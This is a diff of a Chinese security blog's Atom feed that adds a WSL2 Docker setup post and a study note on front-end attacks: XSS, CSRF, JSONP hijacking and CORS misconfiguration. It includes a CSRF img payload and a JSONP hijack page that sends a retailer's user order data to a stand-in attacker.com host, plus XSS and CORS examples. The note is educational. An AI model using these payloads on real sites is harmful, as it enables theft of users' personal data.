@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zzggtt.github.io</id>
     <title>ZG0T01</title>
-    <updated>2020-10-08T08:58:45.998Z</updated>
+    <updated>2020-10-08T09:01:36.191Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zzggtt.github.io"/>
     <link rel="self" href="https://zzggtt.github.io/atom.xml"/>
@@ -19,7 +19,7 @@
         <content type="html"><![CDATA[<h2 id="内外网">内外网</h2>
 <p>一个互联网的现状：在IPV6并未得到普及，而IPV4地址又即将耗尽的情况。通过私有IP技术 +  NAT技术来解决上述问题。现在很多公司、学校内部采用在每个终端设置<strong>私有IP</strong>，而在路由器或必要的服务器上设置<strong>全局IP</strong>。而配置私有IP的终端则通过<strong>NAT</strong>与外部进行通信。</p>
 <p><strong>私有IP</strong>地址范围：</p>
-<p><img src="https://zzggtt.github.io/post-images/1602147475706.png" alt="" loading="lazy"><img src="C:%5CUsers%5C80785%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200914155059239.png" alt="image-20200914155059239" loading="lazy"></p>
+<p><img src="https://zzggtt.github.io/post-images/1602147475706.png" alt="" loading="lazy">!</p>
 <p>除此之外都是<strong>全局IP</strong>。</p>
 <p><strong>NAT</strong>（Network Address Translator）是用于在本地网络中使用私有IP，而在连接互联网时转而使用全局IP的技术。</p>
 <p>工作机制如下：</p>
@@ -57,6 +57,421 @@
 <code>Tomcat</code>就是这样一个容器，如果Web服务器（如Apache）得到一个指向某Servlet的请求（而不是其他请求，如请求一个普通的静态页面），此时Web服务器不是把这个请求交给servlet本身，而是交给部署该Servlet的容器，要由容器向Servlet提供HTTP请求和响应，而且要由容器调用Servlet的方法，如doGet()和doPost()。</p>
 <p>用一个丑陋的图来形容就是：<br>
 <img src="https://zzggtt.github.io/post-images/1601000945479.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Windows下使用WSL2安装Docker]]></title>
+        <id>https://zzggtt.github.io/post/windows-xia-shi-yong-wsl2-an-zhuang-docker/</id>
+        <link href="https://zzggtt.github.io/post/windows-xia-shi-yong-wsl2-an-zhuang-docker/">
+        </link>
+        <updated>2020-09-11T10:20:06.000Z</updated>
+        <content type="html"><![CDATA[<p>以前复现漏洞，都是启动一个Linux虚拟机然后再安装Docker，极其占用内存资源。近期了解到Win10 2004正式版版本支持WSL2，通过在WSL 2上运行的Docker Desktop，完美解决了虚拟机中运行Docker占用内存资源问题。</p>
+<h2 id="docker-desktop-wsl2部署">Docker Desktop WSL2部署</h2>
+<p>Docker Desktop windows版已经能够支持WSL作为Docker Engine运行，可以同时支持在Linux和Windows命令行下操作docke。即简化了Docker的安装，又满足了喜欢在Linux中操作Docker的我。</p>
+<p>具体部署步骤<a href="https://docs.docker.com/docker-for-windows/wsl/">官网</a>写的很详细，自己下面做一个简单总结：</p>
+<h3 id="1-wsl2安装及配置">1、WSL2安装及配置</h3>
+<ol>
+<li>安装Windows 10版本2004或更高版本</li>
+<li>在Windows上<a href="https://docs.microsoft.com/en-us/windows/wsl/install-win10">启用WSL 2功能</a>。</li>
+<li>下载并安装<a href="https://docs.microsoft.com/windows/wsl/wsl2-kernel">Linux内核更新程序包</a>。</li>
+</ol>
+<h3 id="2-docker-desktop安装及配置">2、Docker Desktop安装及配置</h3>
+<p><strong>安装</strong>：下载<a href="https://hub.docker.com/editions/community/docker-ce-desktop-windows/">Docker Desktop Stable 2.3.0.2</a>或更高版本。</p>
+<p><strong>配置</strong>：</p>
+<ol>
+<li>
+<p>使用WSL2作为Docker Engine</p>
+<p>启动Docker后，右击图标选择Settings：</p>
+</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1599819760847.png" alt="" loading="lazy"></figure>
+<p>General ---&gt;&gt;&gt; 勾选Use the WSL2 based engine：</p>
+<p><img src="https://zzggtt.github.io/post-images/1599819814177.png" alt="" loading="lazy"><br>
+应用并重启</p>
+<ol>
+<li>
+<p>修改镜像源为国内镜像</p>
+<p>这里我使用的阿里云镜像，参考：<a href="https://blog.csdn.net/my__holiday/article/details/79111397">window10上docker修改镜像源</a>。</p>
+<p>结果如下：</p>
+</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1599819831626.png" alt="" loading="lazy"></figure>
+<ol start="2">
+<li>
+<p>确保分发以WSL 2模式运行</p>
+<p>在cmd中输入一下命令，以进行检查：</p>
+</li>
+</ol>
+<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1599819838262.png" alt="" loading="lazy"></figure>
+<h3 id="3-快乐的进行漏洞复现">3、快乐的进行漏洞复现</h3>
+<blockquote>
+<p>https://vulhub.org/</p>
+<p>http://vulapps.evalbug.com/</p>
+</blockquote>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[前端黑知识整理]]></title>
+        <id>https://zzggtt.github.io/post/qian-tan-qian-duan-hei/</id>
+        <link href="https://zzggtt.github.io/post/qian-tan-qian-duan-hei/">
+        </link>
+        <updated>2020-08-10T09:07:12.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="前端安全">前端安全</h1>
+<h2 id="前言">前言</h2>
+<p>偶然一次看见亮神博客中分享的一句话后，深有感悟。</p>
+<blockquote>
+<p>在写的过程中，我深深体会到分享者才是学习中的最大受益者，由于需要成文章，所以需要查阅大量的资料。在整个过程中，又学习到很多知识点。</p>
+</blockquote>
+<h2 id="table-of-contents"><strong>Table of  Contents</strong></h2>
+<ul>
+<li><strong>Basical</strong></li>
+<li><strong>XSS</strong></li>
+<li><strong>CSRF</strong></li>
+<li>跨域安全</li>
+</ul>
+<h2 id="basical"><strong>Basical</strong></h2>
+<h4 id="1-前端安全事件的角色">1、前端安全事件的角色</h4>
+<p>Web安全事件的角色如下：</p>
+<ul>
+<li>W3C</li>
+<li><strong>浏览器</strong>厂商</li>
+<li>Web开发商</li>
+<li><strong>用户</strong></li>
+<li>攻击者</li>
+</ul>
+<h4 id="2-浏览器的同源策略">2、浏览器的同源策略</h4>
+<blockquote>
+<p>浏览器的同源策略（Same Origin Policy）是众多安全策略的一个，它是浏览器最基本也是最核心的安全功能。</p>
+<p>如果Web世界没有同源策略，当你登陆Gmial邮箱并打开另一个站点时，这个站点上的JavaScript就可以跨域读取你的Gmail邮箱数据。</p>
+</blockquote>
+<p>它规定：<code>不同域的客户端脚本在没有明确的授权下不能读写对方的资源</code></p>
+<ul>
+<li>
+<p><strong>同域与非同域</strong></p>
+<p>浏览器提出了Origin（源）这一概念，同域要求两个站点<code>同协议、同域名、同端口</code>，下图展示了表中所列站点与http://www.foo.com 是否同域的情况：</p>
+</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1597050632053.png" alt="" loading="lazy"></figure>
+<p>需要注意的是，对于当前页面来说，页面内存放JavaScript文件的域并不重要，重要的是加载JavaScript的页面所在的域。</p>
+<p>在浏览器中script、img、iframe、link等标签的src属性可以跨域加载脚本资源（加载的过程实际上是发起一个GET请求），而不受同域策略限制。加载的脚本资源和本域的资源一样，存在于整个上下文环境种。</p>
+<p>例如a.com加载了b.com的脚本资源：</p>
+<pre><code class="language-javascript">&lt;script src=&quot;htts://www.b.com/b.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>但是b.js被加载后所在的域是a.com而非b.com。</p>
+<ul>
+<li>
+<p><strong>客户端脚本</strong></p>
+<p>在Web发展至现在，客户端脚本主要指的是JavaScript（各浏览器原生支持的脚本语言）。</p>
+</li>
+<li>
+<p><strong>授权</strong></p>
+<p>AJAX是严格遵守浏览器的同源策略的，是不能进行跨域访问资源的。但是在HTML5新标准中，提到了有关于AJAX跨域访问的情况，即CORS策略。只有在资源服务器返回明确的HTTP响应头后，才能跨域访问资源。</p>
+</li>
+<li>
+<p><strong>读写权限</strong></p>
+<p>Web上有很多资源，其权限也不相同。比如：Referer只有读权限，而document.cookie则具备读写权限。</p>
+</li>
+<li>
+<p><strong>资源</strong></p>
+<p>同源策略里的资源指的是Web客户端的资源。一般来说，包括：HTTP响应头、Dom树、浏览器存储的资源（Cookie、locakStorage等）。</p>
+</li>
+</ul>
+<p><strong>Conclusion</strong>：</p>
+<blockquote>
+<p>前端安全以用户和浏览器为对象载体，而浏览器的安全又以同源策略为基础，只有深入理解同源策略，才能研究好前端安全。</p>
+</blockquote>
+<h4 id="3-how-browser-works"><strong>3、how browser works</strong></h4>
+<p>浏览器获得从服务端返回的HTML文档后，会<code>自上而下</code>的加载html文档，并且在加载的过程中进行解析渲染。</p>
+<p>具体流程参考：</p>
+<blockquote>
+<p>How Browser Works：https://github.com/ScrappyZhang/How-browsers-work</p>
+</blockquote>
+<h4 id="4-cookie"><strong>4、Cookie</strong></h4>
+<p>HTTP Cookie是服务器发送到用户浏览器并保存在本地的一段数据。</p>
+<p>同域内浏览器发送的任何一个请求都会带上Cookie，并出现在请求头的Cookie字段中。</p>
+<pre><code class="language-http">GET /sample_page.html HTTP/1.1
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+</code></pre>
+<p>服务器的响应头 Set-Cookie字段跨域增删改Cookie，大多数情况下JavaScript也可以增删改Cookie。</p>
+<pre><code class="language-htt">HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+</code></pre>
+<p>Cookie 主要用于以下三个方面：</p>
+<ul>
+<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>
+<li>个性化设置（如用户自定义设置、主题等）</li>
+<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>
+</ul>
+<h4 id="5-ajax">5、AJAX</h4>
+<p>AJAX（Asynchronous JavaScript And XML）即异步的JavaScript和XML。通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
+<ul>
+<li>
+<p>异步</p>
+<p>异步和同步对应，可以理解为单独开启了一个线程，独立于浏览器主线程去做自己的事，这样浏览器就不会等待。</p>
+</li>
+<li>
+<p>JavaScript</p>
+<p>AJAX本身就是由JavaScript构成的，JQuery就封装了很多与AJAX有关的方法。</p>
+</li>
+<li>
+<p>XML</p>
+<p>XML指的是数据格式，比如，AJAX 发出去的 HTTP 请求，响应回的数据是 XML 格式，然后 JavaScript 去解析这个 XML DOM 树得到相应节点的内容。其实响应回的数据格式还可以是 JSON（已经是主流）、文本、HTML 等。AJAX 中特别提到 XML是因为历史原因。</p>
+</li>
+</ul>
+<h4 id="6-jsonp">6、JSONP</h4>
+<p>JSONP 全称是 JSON with Padding，是为了解决不能跨域获取数据而产生的一种兼容性非常优秀的通信方式。</p>
+<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1597050872718.png" alt="" loading="lazy"></figure>
+<p>参考链接：</p>
+<blockquote>
+<p>https://blog.csdn.net/hansexploration/article/details/80314948</p>
+<p>https://www.cnblogs.com/soyxiaobi/p/9616011.html</p>
+</blockquote>
+<h4 id="7-cors">7、CORS</h4>
+<blockquote>
+<p>AJAX 是严格遵守同源策略的，既不能从另一个域读取数据，也不能发送数据到另一个域。不过有一种情况，可以发送数据到另一个域，W3C 的新标准中，CORS（Cross-Origin Resource Sharing）开始推进浏览器支持这样的跨域方案，现在的浏览器都支持这个方案了</p>
+</blockquote>
+<ul>
+<li>
+<p>工作流程</p>
+<ol>
+<li>用户浏览器对资源服务器发起一个跨域请求，并在请求头中添加<code>Origin头</code>，用于声明请求方的来源。</li>
+<li>资源服务器根据Origin头返回访问控制策略(<code>Access-Control-Allow-Origin</code>响应头)，并在其中声明允许读取响应内容的源。</li>
+<li>浏览器检查资源服务器在<code>Access-Control-Allow-Origin</code>头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许。</li>
+</ol>
+</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1597050864555.png" alt="" loading="lazy"></figure>
+<ul>
+<li>
+<p>附带身份凭证的请求</p>
+<p>一般而言，对于跨域的AJAX请求，浏览器<strong>不会</strong>发送<code>credentials</code>（包括<code>Cookie</code>，TLS客户端证书和代理验证信息）。如果要发送凭证信息，需要设置 <code>XMLHttpRequest</code>的某个特殊标志位。</p>
+<pre><code class="language-html">var xml = new XMLHttpRequest();
+xml.withCredentials = true; //发送凭证
+</code></pre>
+<p>如果跨域请求中带了<code>credentials</code>，那么浏览器会检查资源服务器返回的响应头中<code>Access-Control-Allow-Credentials</code>头是否设置为<code>true</code>，如果是，则允许请求方读取响应内容，否则，不允许。</p>
+</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1597050858624.png" alt="" loading="lazy"></figure>
+<ul>
+<li></li>
+</ul>
+<h2 id="xss"><strong>XSS</strong></h2>
+<h3 id="1-漏洞原理">1、漏洞原理</h3>
+<blockquote>
+<p>XSS（Cross Site Script）即跨站脚本攻击。发生在<strong>目标网站目标用户</strong>的<strong>浏览器</strong>层面。</p>
+<p>当目标用户的浏览器<strong>渲染整个HTML文档</strong>时，出现了不被预期的<strong>脚本指令</strong>并<strong>执行</strong>时，XSS就会发送。</p>
+</blockquote>
+<ul>
+<li>
+<p><strong>场景</strong></p>
+<ul>
+<li>
+<p>目标网站目标用户的浏览器渲染服务端返回的HTML文档时，即浏览器进行<code>HTML解析</code>和<code>JavaScript解析</code>时。</p>
+</li>
+<li>
+<p>浏览器对返回资源类型的判定取决<code>Content-Type</code>响应头。</p>
+</li>
+<li>
+<p>除了浏览器，现在越来越多的客户端软件支持HTML解析和JavaScript解析，比如：QQ、音乐播放器、PDF、文档等等，XSS设计的场景也越来越广。</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>本质</strong></p>
+<p>HTML代码段与用户数据段未分离：</p>
+<pre><code class="language-php+HTML">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;XSS Test&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;?php
+    	$data = $_GET[&quot;param&quot;];
+    	echo &quot;&lt;p&gt;{$data}&lt;/p&gt;&quot;;//$data是用户可控的变量
+    ?&gt;    
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>浏览器把用户的数据段$data，当作HTML代码来解析执行。</p>
+</li>
+</ul>
+<h3 id="2-payload">2、Payload</h3>
+<p>攻击者通过XSS，能够在目标用户浏览的页面中插入恶意的脚本代码，以达到控制用户浏览器的目的。</p>
+<p><strong>利用方式</strong>，可以参考 beef，比如：</p>
+<ul>
+<li>
+<p>普通用户（Cookies、隐私数据、IP、日志、相片、邮件、CSRF 等）</p>
+</li>
+<li>
+<p>管理员（后台地址、页面源码、管理员信息、CSRF 等）</p>
+</li>
+<li>
+<p>客户端攻击（浏览器特权域、插件、APP、WebView 等）</p>
+</li>
+<li>
+<p>内网渗透（端口扫描、ST2利用、路由器）</p>
+</li>
+<li>
+<p>键盘记录、rootkit、蠕虫攻击、水坑、钓鱼、劫持 ）</p>
+</li>
+</ul>
+<p><strong>Payload</strong>可参考：</p>
+<p>[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS Injection)</p>
+<h2 id="csrf"><strong>CSRF</strong></h2>
+<h4 id="1-漏洞原理-2">1、漏洞原理</h4>
+<blockquote>
+<p>当目标用户登陆了目标网站后，被攻击者诱使访问了恶意构造的页面后，浏览器就会带上用户的Cookie在恶意页面对目标网站的某功能发起跨站请求。</p>
+</blockquote>
+<p>某修改个人信息的功能存在CSRF：</p>
+<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1597050842867.png" alt="" loading="lazy"></figure>
+<p>该功能实际上是发出了一个GET请求：</p>
+<pre><code class="language-html">http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678901&amp;add=usa&amp;email=lucy%40qq.com&amp;submit=submit
+</code></pre>
+<p>实际攻击流程如下：</p>
+<ol>
+<li>
+<p>攻击者在自己的网站伪造一个页面(http://www.attacker.com/csrf.html)：</p>
+<pre><code class="language-html">&lt;img src=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678901&amp;add=usa&amp;email=lucy%40qq.com&amp;submit=submit&quot;&gt;
+</code></pre>
+</li>
+<li>
+<p>攻击者诱使已登陆目标网站的目标用户访问该页面：</p>
+</li>
+</ol>
+<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1597050835696.png" alt="" loading="lazy"></figure>
+<p>可以看出浏览器为了加载img标签，去请求了src属性里的url。</p>
+<ol start="3">
+<li>再看看用户的信息，已被修改了：</li>
+</ol>
+<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1597050829227.png" alt="" loading="lazy"></figure>
+<h4 id="2-伪造的本质">2、伪造的本质</h4>
+<p>CSRF攻击之所以能够成功，是因为攻击者可以<code>预测出重要操作请求的所有参数</code>。然后才能伪造出一个页面，去诱使用户访问。</p>
+<p>另一方面，是因为<code>Cookie机制</code>，浏览器发起请求时，会带上用户的Cookie（会话信息），能成功的通过身份认证，去执行重要操作。</p>
+<h4 id="3-payload">3、Payload</h4>
+<ul>
+<li>
+<p>GET请求</p>
+<blockquote>
+<p>直接构造URL</p>
+</blockquote>
+</li>
+<li>
+<p>POST请求</p>
+<blockquote>
+<p>通过HTML的form表单提交数据</p>
+</blockquote>
+</li>
+<li>
+<p>JSON数据格式</p>
+<blockquote>
+<p>通过XMLHttpRequest提交JSON格式的数据</p>
+</blockquote>
+</li>
+</ul>
+<p>具体Payload参考如下：</p>
+<blockquote>
+<p>[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF Injection)</p>
+</blockquote>
+<h2 id="跨域安全">跨域安全</h2>
+<h3 id="jsonp安全">JSONP安全</h3>
+<h4 id="1-json劫持">1、JSON劫持</h4>
+<blockquote>
+<p>JSON劫持的攻击过程是属于CSRF范畴。当某网站通过JSONP 的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。</p>
+</blockquote>
+<p>以乌云网上报告的一个例子（wooyun-2015-0118712）来分析：</p>
+<p>苏宁易购基本所有jsonp接口都没有做防护，导致第三方网站可调用苏宁的jsonp接口获取到用户敏感信息：</p>
+<ul>
+<li>
+<p>漏洞处功能详细说明：</p>
+<blockquote>
+<ul>
+<li>获取用户登陆状态的接口[是否登陆，会员编号] http://my.suning.com/authStatus?callback=jQuery17206592</li>
+<li>获取用户个人信息的接口[加星的邮箱，用户级别，用户安全等级等] http://my.suning.com/memberInfoPageHead.do?callback=jQuery1720402</li>
+<li>获取用户订单信息[下单时间，订单号，订单商品，订单金额，订单状态等] http://www.suning.com/emall/myShoppingOrderCmd?itemNum=3&amp;callback=jQuery1720659299</li>
+<li>获取用户地址簿接口[所有姓名、住址、加星手机号] http://my.suning.com/address.do?callback=jQuery172081</li>
+</ul>
+</blockquote>
+</li>
+<li>
+<p>攻击流程：</p>
+<ul>
+<li>
+<p>攻击者构造一个劫持页面：</p>
+<pre><code class="language-html">&lt;!--编写一个劫持函数：hijack --&gt;
+&lt;script&gt;
+    function hijack(){
+        //alert(data);
+        new Image().src=&quot;http://www.attacker.com/hijack.php?hi=&quot; + escape(data);//将劫持到的数据发送到攻击者服务器上
+    }
+&lt;/script&gt;
+
+&lt;!--获取用户订单信息接口：使用hijack为回调函数--&gt;
+&lt;script src=&quot;http://www.suning.com/emall/myShoppingOrderCmd?itemNum=3&amp;callback=hijack&quot;&gt;&lt;/script&gt;
+</code></pre>
+</li>
+<li>
+<p>然后攻击者欺骗已登陆目标网站（苏宁）的用户访问该页面。</p>
+<blockquote>
+<p>这个攻击过程其实是浏览器发起了一个 CSRF GET 请求。由于目标用户已登陆，所以浏览器发起请求会带上目标用户的cookie身份认证信息，并且服务端返回敏感信息。</p>
+</blockquote>
+</li>
+<li>
+<p>然后目标用户的订单信息就会被劫持发送到攻击者服务器上。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="二-callback-可定义导致的安全问题">二、Callback 可定义导致的安全问题</h4>
+<p>服务端在返回数据时，如果没有严格定义好Content-Type（Content-Type: application/json），再加上callback这个输出点没有进行过滤，而直接输出就会导致一个典型的XSS。</p>
+<p>例如如下一个jsonp接口：</p>
+<pre><code class="language-html">http://example/ajax/services/search/web?v=1.0&amp;q=?&amp;callback=?
+</code></pre>
+<p>客户端除了传递<code>q=?</code>以外，还会传递一个回调函数名给服务端<code>callback=?</code>。</p>
+<p>如果Content-Type（application / javascript）和callback未作过滤，直接返回。通过下面的payload就可以构造一个XSS：</p>
+<pre><code class="language-html">http://example/ajax/services/search/web?v=1.0&amp;q=?&amp;callback=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<h4 id="参考链接">参考链接：</h4>
+<blockquote>
+<p>https://blog.knownsec.com/2015/03/jsonp_security_technic/</p>
+</blockquote>
+<h3 id="cors配置错误">CORS配置错误</h3>
+<p>CORS协议的本质是由服务端配置的策略指导客户端浏览器，以实现跨域资源共享。但是一旦服务器端访问控制策略配置出现错误，就会出现浏览器SOP被绕过，导致用户的信息被劫持。</p>
+<h4 id="1-反射origin">1、反射Origin</h4>
+<p>因为CORS标准规定，<code>Access-Control-Allow-Origin</code>只能配置为单个<code>origin</code>, <code>null</code>或<code>*</code>。如果开发者想要实现同时与多个域名共享域名的需求，则需要专门编写代码或者使用framework来协助动态生成访问控制策略。这种动态生成的做法增加了开发者配置难度。</p>
+<p>最简单地动态生成访问控制策略的方法，就是在<code>Access-Control-Allow-Origin</code>中反射请求的<code>Origin</code>值。例如，下面是一个错误 Nginx 配置示例：</p>
+<pre><code class="language-nginx">add_header &quot;Access-Control-Allow-Origin&quot; $http_origin;
+add_header &quot;Access-Control-Allow-Credentials&quot; &quot;true&quot;;
+</code></pre>
+<h4 id="2-校验origin不严格">2、校验Origin不严格</h4>
+<h4 id="3-null">3、null</h4>
+<p>CORS协议复用了<code>Origin</code>头，但在CORS标准中同样缺乏对跨域请求<code>Origin</code>中<code>null</code>明确的定义和限制。有些开发者在网站上配置信任<code>null</code>，用于与本地file页面共享数据，如下所示：</p>
+<pre><code class="language-http">Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials:true
+</code></pre>
+<p>但是事实上，除了本地file页面的跨域请求Origin头为null外，攻击者还可以从任意域下通过iframe sandbox构造Origin为null的跨域请求，如下是一段示意代码：</p>
+<pre><code class="language-html">&lt;iframe
+    sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot;
+    src=&quot;data:text/html,&lt;script&gt;XMLHttpRequest here&lt;/script&gt;&quot;
+&gt;
+&lt;/iframe&gt;
+</code></pre>
+<p>这就意味着任何配置有<code>Access-Control-Allow-Origin: null</code>和<code>Access-Control-Allow-Credentials: true</code>的网站等同于没有浏览器SOP的保护，都可以被其他任意域以这种方式读取内容。</p>
+<h4 id="4-https域信任http域">4、HTTPS域信任HTTP域</h4>
+<p>HTTPS协议被设计用于在不安全的中间网络中进行安全通信。即使在中间人网络环境下，攻击者也应该无法读取HTTPS网站的内容。但是如果该HTTPS网站配置了CORS且信任HTTP域，那么中间人攻击者可以先劫持受信任HTTP域，然后通过这个域发送跨域请求到HTTPS网站，间接读取HTTPS域下的受保护内容。具体流程如图所示，中间人攻击者可以可以利用<code>http://example.com</code>网站为跳板，窃取 HTTPS 网站的内容。</p>
+<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1597050727693.png" alt="" loading="lazy"></figure>
+<h4 id="payload">Payload</h4>
+<blockquote>
+<p>[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS Misconfiguration)</p>
+</blockquote>
+<h4 id="参考链接-2">参考链接：</h4>
+<blockquote>
+<p>https://research.qianxin.com/archives/290</p>
+</blockquote>
 ]]></content>
     </entry>
 </feed>
